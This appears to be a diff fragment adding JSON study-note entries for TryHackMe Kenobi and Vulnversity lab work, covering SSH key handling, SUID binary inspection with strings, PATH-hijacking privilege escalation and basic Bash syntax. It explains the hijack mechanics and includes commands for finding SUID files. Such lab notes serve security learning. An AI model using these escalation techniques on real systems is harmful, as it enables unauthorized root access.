+          "code": "chmod 600 ~/kenobi_id_rsa\nssh -i ~/kenobi_id_rsa kenobi@<TARGET_IP>",
+          "explanation": "Restrict access and identify which private key SSH should use."
+        }
+      ],
+      "pitfalls": [
+        "Never commit private keys into a public repository or report."
+      ],
+      "sourceLabs": [
+        "tryhackme-kenobi"
+      ],
+      "references": []
+    },
+    {
+      "id": "strings-and-path",
+      "title": "SUID menu analysis and PATH hijacking",
+      "date": "2026-11-12",
+      "category": "Linux privilege escalation",
+      "kind": "technique",
+      "summary": "A SUID program that resolves external command names through PATH can select an unintended executable.",
+      "tags": [
+        "SUID",
+        "strings",
+        "system()",
+        "PATH"
+      ],
+      "takeaways": [
+        "`strings` is a clue-finding tool, not source-code reconstruction.",
+        "`system()` invokes commands through a shell and can create command-resolution risk.",
+        "`export PATH=/home/kenobi/tools/:$PATH` adds a new first directory and preserves old ones."
+      ],
+      "content": "## Discovery\nKenobi's custom `/usr/bin/menu` was SUID. `strings` exposed `setuid`, `system`, `curl -I localhost`, `uname -r`, and `ifconfig`. This suggested the program might launch shell commands by names rather than fixed paths.\n\n## PATH lookup\nThe shell searches directories listed in `PATH` **left to right**. Adding a writable directory at the front can change which same-named executable is found. The effect on privileges depends on how the parent program launches the command and whether elevated identity is preserved.\n\n**Current status:** learned with guidance; the learner explicitly wants more independent command-building practice. The submitted transcript does not include the final root-shell identity for this lab.",
+      "examples": [
+        {
+          "title": "Inspect embedded strings",
+          "language": "bash",
+          "code": "strings /usr/bin/menu | grep -E 'curl|uname|ifconfig'",
+          "explanation": "Search for human-readable command references."
+        },
+        {
+          "title": "Inspect command resolution",
+          "language": "bash",
+          "code": "echo \"$PATH\"\nwhich curl",
+          "explanation": "Check search order and current executable location."
+        },
+        {
+          "title": "Prepend a directory",
+          "language": "bash",
+          "code": "export PATH=/home/kenobi/tools/:$PATH",
+          "explanation": "Search custom tools first without discarding existing PATH entries."
+        }
+      ],
+      "pitfalls": [
+        "A matching string does not establish a vulnerable call path.",
+        "A PATH hijack only escalates privileges when the privileged execution conditions are present."
+      ],
+      "sourceLabs": [
+        "tryhackme-kenobi"
+      ],
+      "references": []
+    },
+    {
+      "id": "bash-commands",
+      "title": "Shell building blocks practiced",
+      "date": "2026-11-12",
+      "category": "Shell & scripting",
+      "kind": "command",
+      "summary": "Basic Linux shell syntax needed to construct commands without relying on copy-paste.",
+      "tags": [
+        "Bash",
+        "PATH",
+        "chmod",
+        "find"
+      ],
+      "takeaways": [
+        "Prefer understanding each argument and operator instead of memorizing attack payloads."
+      ],
+      "content": "## Building blocks\n- `export VAR=value` makes a variable available to child processes.\n- `$VAR` expands to the variable's existing value.\n- `:` separates directories in `PATH`.\n- `>` redirects standard output to a file; `2>&1` redirects standard error to the same output destination.\n- `chmod +x` makes a script executable; `chmod 600` restricts a private key to its owner.\n- `find / -perm -u=s -type f 2>/dev/null` searches for SUID files while suppressing errors.\n- A here-document (`<<'EOF'`) is one way to write multi-line text into a script or service file.\n\nThe learner can explain `export PATH=/home/kenobi/tools/:$PATH` and wants more practice constructing scripts independently.",
+      "examples": [
+        {
+          "title": "Modify a PATH safely",
+          "language": "bash",
+          "code": "export PATH=/home/kenobi/tools/:$PATH",
+          "explanation": "Prepend a directory while preserving the old PATH."
+        },
+        {
+          "title": "Write a simple file with a here-document",
+          "language": "bash",
+          "code": "cat > /tmp/example-note <<'EOF'\nA practice note\nEOF",
+          "explanation": "Create a multi-line text file without an editor."
+        }
+      ],
+      "pitfalls": [
+        "Changing PATH affects the current shell and exported child process environment, not other existing sessions."
+      ],
+      "sourceLabs": [
+        "tryhackme-vulnversity",
+        "tryhackme-kenobi"
+      ],
+      "references": []
+    }
+  ]
+}
